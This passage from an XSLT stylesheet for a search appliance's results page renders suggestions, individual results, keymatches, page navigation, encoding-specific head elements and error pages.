    <xsl:if test="$show_bottom_search_box != '0'">
      <xsl:call-template name="bottom_search_box"/>
    </xsl:if>

</xsl:template>


<!-- **********************************************************************
 Stopwords suggestions in result page (do not customize)
     ********************************************************************** -->
<xsl:template name="stopwords">
  <xsl:variable name="stopwords_suggestions1">
    <xsl:call-template name="replace_string">
      <xsl:with-param name="find" select="'/help/basics.html#stopwords'"/>
      <xsl:with-param name="replace" select="'basics.html#stopwords'"/>
      <xsl:with-param name="string" select="/GSP/CT"/>
    </xsl:call-template>
  </xsl:variable>

  <xsl:variable name="stopwords_suggestions">
    <xsl:call-template name="replace_string">
      <xsl:with-param name="find" select="'/help/basics.html'"/>
      <xsl:with-param name="replace" select="'basics.html'"/>
      <xsl:with-param name="string" select="$stopwords_suggestions1"/>
    </xsl:call-template>
  </xsl:variable>

  <xsl:if test="/GSP/CT">
    <font size="-1" color="gray">
      <xsl:value-of disable-output-escaping="yes" 
        select="$stopwords_suggestions"/>
    </font>
  </xsl:if>
</xsl:template>


<!-- **********************************************************************
 Spelling suggestions in result page (do not customize)
     ********************************************************************** -->
<xsl:template name="spelling">
  <xsl:if test="/GSP/Spelling/Suggestion">
    <p><span class="p"><font color="{$spelling_text_color}">
         <xsl:value-of select="$spelling_text"/>
         <xsl:call-template name="nbsp"/>
       </font></span> 
       <a href="/search?q={/GSP/Spelling/Suggestion[1]/@q}&amp;spell=1&amp;{$base_url}">
       <xsl:value-of disable-output-escaping="yes" 
         select="/GSP/Spelling/Suggestion[1]"/>
      </a>
    </p>
  </xsl:if>
</xsl:template>


<!-- **********************************************************************
 Synonym suggestions in result page (do not customize)
     ********************************************************************** -->
<xsl:template name="synonyms">
  <xsl:if test="/GSP/Synonyms/OneSynonym">
    <p><span class="p"><font color="{$synonyms_text_color}">
         <xsl:value-of select="$synonyms_text"/>
         <xsl:call-template name="nbsp"/>
       </font></span> 
    <xsl:for-each select="/GSP/Synonyms/OneSynonym">
      <a href="/search?q={@q}&amp;{$synonym_url}">
        <xsl:value-of disable-output-escaping="yes" select="."/>
      </a><xsl:text> </xsl:text>      
    </xsl:for-each>
    </p>
  </xsl:if>
</xsl:template>


<!-- ********************************************************************** 
  A single result (do not customize)
     ********************************************************************** -->
<xsl:template match="R">
  <xsl:param name="query"/>
  <xsl:variable name="stripped_url" select="substring-after(U, '://')"/>
  <xsl:variable name="full_url" select="UE"/>
  <xsl:variable name="crowded_url" select="HN/@U"/>
  <xsl:variable name="crowded_display_url" select="HN"/>
  <xsl:variable name="lower" select="'abcdefghijklmnopqrstuvwxyz'"/>
  <xsl:variable name="upper" select="'ABCDEFGHIJKLMNOPQRSTUVWXYZ'"/>

  <!-- *** Indent as required (only supports 2 levels) *** -->
  <xsl:if test="@L='2'"><xsl:text 
    disable-output-escaping="yes">&lt;blockquote&gt;</xsl:text></xsl:if>

  <!-- *** Result Header *** -->
  <p>

  <!-- *** Result Title (including PDF tag and hyperlink) *** -->
  <xsl:if test="$show_res_title != '0'"> 
    <font size="-2"><b>
    <xsl:choose>
      <xsl:when test="@MIME='text/html' or @MIME='' or not(@MIME)"></xsl:when>
      <xsl:when test="@MIME='text/plain'">[TEXT]</xsl:when>
      <xsl:when test="@MIME='application/rtf'">[RTF]</xsl:when>
      <xsl:when test="@MIME='application/pdf'">[PDF]</xsl:when>
      <xsl:when test="@MIME='application/postscript'">[PS]</xsl:when>
      <xsl:when 
        test="@MIME='application/vnd.ms-powerpoint'">[MS POWERPOINT]</xsl:when>
      <xsl:when test="@MIME='application/vnd.ms-excel'">[MS EXCEL]</xsl:when>
      <xsl:when test="@MIME='application/msword'">[MS WORD]</xsl:when>
      <xsl:otherwise>
        <xsl:variable name="extension">
          <xsl:call-template name="last_substring_after">
            <xsl:with-param name="string" select="substring-after(
                                                  substring-after(U,'://'),
                                                  '/')"/>
            <xsl:with-param name="separator" select="'.'"/>
            <xsl:with-param name="fallback" select="'UNKNOWN'"/>
          </xsl:call-template>
        </xsl:variable>
        [<xsl:value-of select="translate($extension,$lower,$upper)"/>]
      </xsl:otherwise>
    </xsl:choose>
    </b></font>
    <xsl:text> </xsl:text>

    <xsl:if test="not(starts-with($stripped_url, 'noindex!/'))"> 
      <xsl:text disable-output-escaping='yes'>&lt;a href="</xsl:text
      ><xsl:value-of disable-output-escaping='yes' select="U"
      /><xsl:text disable-output-escaping='yes'>"&gt;</xsl:text>
    </xsl:if> 
    <span class="l">
    <xsl:choose>
      <xsl:when test="T">
        <xsl:call-template name="reformat_keyword">
          <xsl:with-param name="orig_string" select="T"/>
        </xsl:call-template>
      </xsl:when>
      <xsl:otherwise><xsl:value-of select="$stripped_url"/></xsl:otherwise>
    </xsl:choose>
    </span>
    <xsl:if test="not(starts-with($stripped_url, 'noindex!/'))">
        <xsl:text disable-output-escaping='yes'>&lt;/a&gt;</xsl:text>
    </xsl:if> 
  </xsl:if>
    
  <!-- *** Snippet *** -->
  <xsl:if test="$show_res_snippet != '0'">
    <br/>
    <span class="s">
      <xsl:call-template name="reformat_keyword">
        <xsl:with-param name="orig_string" select="S"/>
      </xsl:call-template>
    </span>
  </xsl:if>

  <!-- *** Description *** -->
  <xsl:if test="$show_res_description != '0'">
    <xsl:apply-templates select="HAS/DI/DS"/>
  </xsl:if>

  <!-- *** URL *** -->
    <br/>
    <font color="{$res_url_color}" size="{$res_url_size}">
      <xsl:choose>
        <xsl:when test="starts-with($stripped_url, 'noindex!/')">
          <xsl:if test="($show_res_size!='0') or 
                        ($show_res_date!='0') or 
                        ($show_res_cache!='0')">
            <xsl:text>Not Indexed: </xsl:text>
            <xsl:value-of select="substring($stripped_url, 10)"/>
          </xsl:if>
	</xsl:when>
        <xsl:otherwise>
          <xsl:if test="$show_res_url != '0'">
            <xsl:value-of select="$stripped_url"/>
          </xsl:if>
        </xsl:otherwise>
      </xsl:choose>
    </font>

  <!-- *** Miscellaneous (- size - date - cache) *** -->
    <xsl:if test="not(starts-with($stripped_url, 'noindex!/'))">
      <xsl:apply-templates select="HAS/C">
        <xsl:with-param name="full_url" select="$full_url"/>
        <xsl:with-param name="query" select="$query"/>
        <xsl:with-param name="mime" select="@MIME"/>
        <xsl:with-param name="date" select="FS[@NAME='date']/@VALUE"/>
      </xsl:apply-templates>
    </xsl:if>


  <!-- *** Link to more links from this site *** -->
      <xsl:if test="HN">
        <br/>
        [
        <a class="f" href="/search?as_sitesearch={$crowded_url}&amp;{
          $search_url}">More results from <xsl:value-of 
	  select="$crowded_display_url"/></a>
        ]
      </xsl:if>


  <!-- *** Result Footer *** -->
  </p>

  <!-- *** End indenting as required (only supports 2 levels) *** -->
  <xsl:if test="@L='2'"><xsl:text 
    disable-output-escaping="yes">&lt;/blockquote&gt;</xsl:text>
  </xsl:if>

</xsl:template>


<!-- ********************************************************************** 
  A single keymatch result (do not customize)
     ********************************************************************** -->
<xsl:template match="GM">
  <p>
    <table cellpadding="4" cellspacing="0" border="0" height="40" width="100%">
      <tr>
        <td nowrap="0" bgcolor="{$keymatch_bg_color}" height="40">
          <a href="{GL}">
            <xsl:value-of select="GD"/>
          </a>
          <br/>
          <font size="-1" color="{$res_url_color}">
            <span class="a">
               <xsl:value-of select="GL"/>
            </span>
          </font>
        </td>
        <td bgcolor="{$keymatch_bg_color}" height="40" 
          align="right" valign="top">
	  <b>
          <font size="-1" color="{$keymatch_text_color}">
            <xsl:value-of select="$keymatch_text"/>
          </font>
	  </b>
        </td>
      </tr>           
    </table>
  </p>
</xsl:template>


<!-- ********************************************************************** 
  Variables for reformatting keyword-match display (do not customize)
     ********************************************************************** -->
<xsl:variable name="keyword_orig_start" select="'&lt;b&gt;'"/>
<xsl:variable name="keyword_orig_end" select="'&lt;/b&gt;'"/>

<xsl:variable name="keyword_reformat_start">
  <xsl:if test="$res_keyword_format">
    <xsl:text>&lt;</xsl:text>
    <xsl:value-of select="$res_keyword_format"/>
    <xsl:text>&gt;</xsl:text>
  </xsl:if>
  <xsl:if test="($res_keyword_size) or ($res_keyword_color)">
  <xsl:text>&lt;font</xsl:text>
  <xsl:if test="$res_keyword_size">
    <xsl:text> size="</xsl:text>
    <xsl:value-of select="$res_keyword_size"/>
    <xsl:text>"</xsl:text>
  </xsl:if>
  <xsl:if test="$res_keyword_color">
    <xsl:text> color="</xsl:text>
    <xsl:value-of select="$res_keyword_color"/>
    <xsl:text>"</xsl:text>
  </xsl:if>
  <xsl:text>&gt;</xsl:text>
  </xsl:if>
</xsl:variable>

<xsl:variable name="keyword_reformat_end">
  <xsl:if test="($res_keyword_size) or ($res_keyword_color)">
    <xsl:text>&lt;/font&gt;</xsl:text>
  </xsl:if>
  <xsl:if test="$res_keyword_format">
    <xsl:text>&lt;/</xsl:text>
    <xsl:value-of select="$res_keyword_format"/>
    <xsl:text>&gt;</xsl:text>
  </xsl:if>
</xsl:variable>

<!-- ********************************************************************** 
  Reformat the keyword match display in a title/snippet string 
     (do not customize)
     ********************************************************************** -->
<xsl:template name="reformat_keyword">
  <xsl:param name="orig_string"/>

  <xsl:variable name="reformatted_1">
    <xsl:call-template name="replace_string">
      <xsl:with-param name="find" select="$keyword_orig_start"/>
      <xsl:with-param name="replace" select="$keyword_reformat_start"/>
      <xsl:with-param name="string" select="$orig_string"/>
    </xsl:call-template>
  </xsl:variable>

  <xsl:variable name="reformatted_2">
    <xsl:call-template name="replace_string">
      <xsl:with-param name="find" select="$keyword_orig_end"/>
      <xsl:with-param name="replace" select="$keyword_reformat_end"/>
      <xsl:with-param name="string" select="$reformatted_1"/>
    </xsl:call-template>
  </xsl:variable>

  <xsl:value-of disable-output-escaping='yes' select="$reformatted_2"/>

</xsl:template>


<!-- ********************************************************************** 
  Helper templates for generating a result item (do not customize)
     ********************************************************************** -->

<!-- *** Description *** -->
<xsl:template match="DS">
    <br/>
    <font size="-1">
      <span class="f">Description: </span><xsl:value-of 
        disable-output-escaping='yes' select="."/>
    </font>
</xsl:template>

<!-- *** Miscellaneous: - size - date - cache *** -->
<xsl:template match="C">
    <xsl:param name="full_url"/>
    <xsl:param name="query"/>
    <xsl:param name="mime"/>
    <xsl:param name="date"/>

    <xsl:variable name="docid"><xsl:value-of select="@CID"/></xsl:variable>

    <xsl:if test="$show_res_size != '0'">
    <xsl:if test="not(@SZ='')">
      <font size="-1">
        <xsl:text> - </xsl:text>
        <xsl:value-of select="@SZ"/>
      </font>
    </xsl:if>
    </xsl:if>

    <xsl:if test="$show_res_date != '0'">
    <xsl:if test="($date != '') and 
                  (translate($date, '-', '') &gt; 19500000) and 
                  (translate($date, '-', '') &lt; 21000000)">
      <font size="-1">
        <xsl:text> - </xsl:text>
        <xsl:value-of select="$date"/>
      </font>
    </xsl:if>
    </xsl:if>

    <xsl:if test="$show_res_cache != '0'">
        <xsl:text> - </xsl:text>
        <a class="f" href="/search?q=cache:{$docid}{$full_url}+{
                           $stripped_search_query}&amp;{$base_url}">
          <xsl:choose>
            <xsl:when test="not($mime)">Cached</xsl:when>
            <xsl:when test="$mime='text/html'">Cached</xsl:when>
            <xsl:when test="$mime='text/plain'">Cached</xsl:when>
            <xsl:otherwise>Text Version</xsl:otherwise>
          </xsl:choose>
        </a>
    </xsl:if>
    
</xsl:template>


<!-- **********************************************************************
 Google navigation bar in result page (do not customize)
     ********************************************************************** -->
<xsl:template name="google_navigation">
    <xsl:param name="prev"/>
    <xsl:param name="next"/>
    <xsl:param name="view_begin"/>
    <xsl:param name="view_end"/>
    <xsl:param name="guess"/>
    <xsl:param name="navigation_style"/>

  <xsl:variable name="fontclass">
    <xsl:choose>
      <xsl:when test="$navigation_style = 'top'">s</xsl:when>
      <xsl:otherwise>b</xsl:otherwise>
    </xsl:choose> 
  </xsl:variable>

  <!-- *** Test to see if we should even show navigation *** -->
  <xsl:if test="($prev) or ($next)">

  <!-- *** Start Google result navigation bar *** -->

    <xsl:if test="$navigation_style != 'top'">
      <xsl:text disable-output-escaping="yes">&lt;center&gt;
        &lt;div class=&quot;n&quot;&gt;</xsl:text>
    </xsl:if>
    
    <table border="0" cellpadding="0" width="1%" cellspacing="0">
      <tr align="center" valign="top">
	<xsl:if test="$navigation_style != 'top'">
        <td valign="bottom" nowrap="1">
          <font size="-1">
            Result<xsl:call-template name="nbsp"
                  />Page:<xsl:call-template name="nbsp"/>
          </font>
        </td>
	</xsl:if>
        
  <!-- *** Show previous navigation, if available *** -->
	<xsl:choose>
          <xsl:when test="$prev">
            <td> 
	      <span class="{$fontclass}">
              <a href="/search?{$search_url}&amp;start={$view_begin -
                      $num_results - 1}">
	        <xsl:if test="$navigation_style = 'google'">
                  <img src="/nav_previous.gif" width="68" height="26" 
                    alt="" border="0"/>
                  <br/>
 	        </xsl:if>
                <xsl:if test="$navigation_style = 'top'">
                  <xsl:text>&lt;</xsl:text>
                </xsl:if>
                <xsl:text>Previous</xsl:text>
              </a>
              </span>
              <xsl:if test="$navigation_style != 'google'">
  	        <xsl:call-template name="nbsp"/>
              </xsl:if>
            </td>
          </xsl:when>
          <xsl:otherwise>
            <td>
              <xsl:if test="$navigation_style = 'google'">
                <img src="/nav_first.gif" width="18" height="26" 
                  alt="" border="0"/>
                <br/>
	      </xsl:if>
            </td>
          </xsl:otherwise>
        </xsl:choose>

        <xsl:if test="($navigation_style = 'google') or 
                      ($navigation_style = 'link')">
  <!-- *** Google result set navigation *** -->
        <xsl:variable name="mod_end">
          <xsl:choose>
            <xsl:when test="$next"><xsl:value-of select="$guess"/></xsl:when>
            <xsl:otherwise><xsl:value-of select="$view_end"/></xsl:otherwise>
          </xsl:choose>
        </xsl:variable>

        <xsl:call-template name="result_nav">
          <xsl:with-param name="start" select="0"/>
          <xsl:with-param name="end" select="$mod_end"/>
          <xsl:with-param name="current_view" select="($view_begin)-1"/>
          <xsl:with-param name="navigation_style" select="$navigation_style"/>
        </xsl:call-template>
        </xsl:if>

  <!-- *** Show next navigation, if available *** -->
        <xsl:choose>
          <xsl:when test="$next">
            <td nowrap="1">
              <xsl:if test="$navigation_style != 'google'">
  	        <xsl:call-template name="nbsp"/>
              </xsl:if>
              <span class="{$fontclass}">
              <a href="/search?{$search_url}&amp;start={$view_begin +
                $num_results - 1}">
	        <xsl:if test="$navigation_style = 'google'">
                  <img src="/nav_next.gif" width="100" height="26" 
	            alt="" border="0"/>
                  <br/>
	        </xsl:if>
                <xsl:text>Next</xsl:text>
                <xsl:if test="$navigation_style = 'top'">
                  <xsl:text>&gt;</xsl:text>
                </xsl:if>
              </a>
              </span>
            </td>
          </xsl:when>
          <xsl:otherwise>
            <td nowrap="1">
              <xsl:if test="$navigation_style != 'google'">
	        <xsl:call-template name="nbsp"/>
              </xsl:if>
              <xsl:if test="$navigation_style = 'google'">
                <img src="/nav_last.gif" width="46" height="26" 
	          alt="" border="0"/>
                <br/>
	      </xsl:if>
            </td>
          </xsl:otherwise>
        </xsl:choose>

  <!-- *** End Google result bar *** -->
      </tr>
    </table>
    
    <xsl:if test="$navigation_style != 'top'">
      <xsl:text disable-output-escaping="yes">&lt;/div&gt;
        &lt;/center&gt;</xsl:text>
    </xsl:if>
  </xsl:if>
</xsl:template>

<!-- **********************************************************************
 Helper templates for generating Google result navigation (do not customize)
   only shows 10 sets up or down from current view
     ********************************************************************** -->
<xsl:template name="result_nav">
  <xsl:param name="start" select="'0'"/>
  <xsl:param name="end"/>
  <xsl:param name="current_view"/>
  <xsl:param name="navigation_style"/>

  <!-- *** Choose how to show this result set *** -->
  <xsl:choose>
    <xsl:when test="($start)&lt;(($current_view)-(10*($num_results)))">
    </xsl:when>
    <xsl:when test="(($current_view)&gt;=($start)) and 
                    (($current_view)&lt;(($start)+($num_results)))">
      <td>
        <xsl:if test="$navigation_style = 'google'">
          <img src="/nav_current.gif" width="16" height="26" alt=""/>
          <br/>
        </xsl:if>
        <xsl:if test="$navigation_style = 'link'">
	  <xsl:call-template name="nbsp"/>
        </xsl:if>
	<span class="i"><xsl:value-of 
          select="(($start)div($num_results))+1"/></span>
        <xsl:if test="$navigation_style = 'link'">
	  <xsl:call-template name="nbsp"/>
        </xsl:if>
      </td>
    </xsl:when>
    <xsl:otherwise>
      <td>
        <xsl:if test="$navigation_style = 'link'">
  	  <xsl:call-template name="nbsp"/>
        </xsl:if>
        <a href="/search?{$search_url}&amp;start={$start}">
        <xsl:if test="$navigation_style = 'google'">
          <img src="/nav_page.gif" width="16" height="26" alt="" border="0"/>
          <br/>
        </xsl:if>
        <xsl:value-of select="(($start)div($num_results))+1"/>
        </a>
        <xsl:if test="$navigation_style = 'link'">
 	  <xsl:call-template name="nbsp"/>
        </xsl:if>
      </td>
    </xsl:otherwise>
  </xsl:choose>
  
  <!-- *** Recursively iterate through result sets to display *** -->
  <xsl:if test="((($start)+($num_results))&lt;($end)) and 
                ((($start)+($num_results))&lt;(($current_view)+
                (10*($num_results))))">
    <xsl:call-template name="result_nav">
      <xsl:with-param name="start" select="$start+$num_results"/>
      <xsl:with-param name="end" select="$end"/>
      <xsl:with-param name="current_view" select="$current_view"/>
      <xsl:with-param name="navigation_style" select="$navigation_style"/>
    </xsl:call-template>
  </xsl:if>

</xsl:template>


<!-- **********************************************************************
 Top separation bar (do not customize)
     ********************************************************************** -->
<xsl:template name="top_sep_bar">
  <xsl:param name="query"/>
  <xsl:param name="time"/>

    <table width="100%" cellpadding="2" cellspacing="0" border="0">
      <tr>
        <td class="t" nowrap="1">
 	  <xsl:if test="$show_search_info != '0'">
            <font size="-1">
              Searched for
              <b><font color="{$sep_bar_text_color}">
                <xsl:value-of disable-output-escaping="yes" 
                select="$html_escaped_query"/></font>
              </b>.
            </font> 
          </xsl:if>
          <font size="-6"><xsl:call-template name="nbsp"/></font>
        </td>

        <td class="t" align="right" nowrap="1">
	  <xsl:if test="$show_search_info != '0'">
            <font size="-1">
            <xsl:if test="count(/GSP/RES/R)>0 ">
              Results 
              <b><xsl:value-of select="RES/@SN"/> - <xsl:value-of 
                   select="RES/@EN"/></b>
              <xsl:if test="$access = 'p'">
                of about <b><xsl:value-of select="RES/M"/></b>
              </xsl:if>.
            </xsl:if>
              Search took 
              <b><xsl:value-of 
                   select="round($time * 100.0) div 100.0"/></b> seconds.
            </font>
          </xsl:if>
        </td>
      </tr>
    </table>
    <hr class="z"/>
</xsl:template>

<!-- **********************************************************************
 Utility function for constructing copyright text (do not customize)
     ********************************************************************** -->
<xsl:template name="copyright">
  <center>
    <br/><br/>
    <p>
    <font face="arial,sans-serif" size="-1" color="#2f2f2f">
      Powered by Google</font>
    </p>
  </center>
</xsl:template>


<!-- **********************************************************************
 Utility functions for generating html entities 
     ********************************************************************** -->
<xsl:template name="nbsp">
  <xsl:text disable-output-escaping="yes">&amp;nbsp;</xsl:text>
</xsl:template>
<xsl:template name="nbsp3">
  <xsl:call-template name="nbsp"/>
  <xsl:call-template name="nbsp"/>
  <xsl:call-template name="nbsp"/>
</xsl:template>
<xsl:template name="nbsp4">
  <xsl:call-template name="nbsp3"/>
  <xsl:call-template name="nbsp"/>
</xsl:template>
<xsl:template name="quot">
  <xsl:text disable-output-escaping="yes">&amp;quot;</xsl:text>
</xsl:template>
<xsl:template name="copy">
  <xsl:text disable-output-escaping="yes">&amp;copy;</xsl:text>
</xsl:template>

<!-- **********************************************************************
 Utility functions for generating head elements so that the XSLT processor
 won't add a meta tag to the output, since it may specify the wrong
 encoding (utf8) in the meta tag. 
     ********************************************************************** -->
<xsl:template name="plainHeadStart">
  <xsl:text disable-output-escaping="yes">&lt;head&gt;</xsl:text>
  <xsl:text>
  </xsl:text>
</xsl:template>
<xsl:template name="plainHeadEnd">
  <xsl:text disable-output-escaping="yes">&lt;/head&gt;</xsl:text>
  <xsl:text>
  </xsl:text>
</xsl:template>


<!-- **********************************************************************
 Utility functions for generating head elements with a meta tag to the output
 specifying the character set as requested 
     ********************************************************************** -->
<xsl:template name="langHeadStart">
  <xsl:text disable-output-escaping="yes">&lt;head&gt;</xsl:text>
  <xsl:choose>
    <xsl:when test="PARAM[(@name='oe') and (@value='utf8')]">
      <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='oe') and (@value!='')]">
      <meta http-equiv="content-type" content="text/html; charset={PARAM[@name='oe']/@value}"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_zh-CN')]">
      <meta http-equiv="content-type" content="text/html; charset=GB2312"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_zh-TW')]">
      <meta http-equiv="content-type" content="text/html; charset=Big5"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_cs')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-2"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_da')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_nl')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_en')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_et')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_fi')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_fr')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_de')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_el')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-7"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_iw')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-8-I"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_hu')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-2"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_is')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_it')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_ja')]">
      <meta http-equiv="content-type" content="text/html; charset=Shift_JIS"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_ko')]">
      <meta http-equiv="content-type" content="text/html; charset=EUC-KR"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_lv')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_lt')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_no')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_pl')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-2"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_pt')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_ro')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-2"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_ru')]">
      <meta http-equiv="content-type" content="text/html; charset=windows-1251"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_es')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:when test="PARAM[(@name='lr') and (@value='lang_sv')]">
      <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"/>
    </xsl:when>
    <xsl:otherwise>
      <meta http-equiv="content-type" content="text/html; charset="/>
    </xsl:otherwise>
  </xsl:choose>
  <xsl:text>
  </xsl:text>
</xsl:template>

<xsl:template name="langHeadEnd">
  <xsl:text disable-output-escaping="yes">&lt;/head&gt;</xsl:text>
  <xsl:text>
  </xsl:text>
</xsl:template>


<!-- **********************************************************************
 Utility functions (do not customize)
     ********************************************************************** -->

<!-- *** Find the substring after the last occurence of a separator *** -->
<xsl:template name="last_substring_after">

  <xsl:param name="string"/>
  <xsl:param name="separator"/>
  <xsl:param name="fallback"/>

  <xsl:variable name="newString" 
    select="substring-after($string, $separator)"/>

  <xsl:choose>
    <xsl:when test="$newString!=''">
      <xsl:call-template name="last_substring_after">
        <xsl:with-param name="string" select="$newString"/>
        <xsl:with-param name="separator" select="$separator"/>
        <xsl:with-param name="fallback" select="$newString"/>
      </xsl:call-template>
    </xsl:when>
    <xsl:otherwise>
      <xsl:value-of select="$fallback"/>
    </xsl:otherwise>
  </xsl:choose>

</xsl:template>

<!-- *** Find and replace *** -->
<xsl:template name="replace_string">
  <xsl:param name="find"/>
  <xsl:param name="replace"/>
  <xsl:param name="string"/>
  <xsl:choose>
    <xsl:when test="contains($string, $find)">
      <xsl:value-of select="substring-before($string, $find)"/>
      <xsl:value-of select="$replace"/>
      <xsl:call-template name="replace_string">
        <xsl:with-param name="find" select="$find"/>
        <xsl:with-param name="replace" select="$replace"/>
        <xsl:with-param name="string" 
          select="substring-after($string, $find)"/>
      </xsl:call-template>    
    </xsl:when>
    <xsl:otherwise>
      <xsl:value-of select="$string"/>
    </xsl:otherwise>
  </xsl:choose>
</xsl:template>

<!-- **********************************************************************
 Display server error message
     ********************************************************************** -->
<xsl:template name="server_error">
  <html>
    <xsl:call-template name="plainHeadStart"/>
      <title><xsl:value-of select="error_page_title"/></title>   
    <xsl:call-template name="plainHeadEnd"/>
    <body>
      <xsl:copy-of select="descendant::*"/>
    </body>
  </html>
</xsl:template>

<!-- **********************************************************************
 Display other error message
     ********************************************************************** -->
<xsl:template name="error_page">
  <xsl:param name="errorMessage"/>
  <xsl:param name="errorDescription"/>
  <html>
    <xsl:call-template name="plainHeadStart"/>
      <title>
        <xsl:value-of select="$error_page_title"/>:
        <xsl:value-of select="$errorMessage"/>
      </title>   
    <xsl:call-template name="plainHeadEnd"/>
    <body>
      <xsl:value-of select="$error_page_title"/>: 
      <xsl:value-of select="$errorMessage"/><br/><br/>
      <xsl:value-of select="$errorDescription"/><br/><br/>
      <xsl:text>


      </xsl:text>
      <xsl:copy-of select="/"/>
    </body>
  </html>
</xsl:template>


<!-- **********************************************************************
 Swallow unmatched elements
     ********************************************************************** -->
<xsl:template match="@*|node()"/>
</xsl:stylesheet>
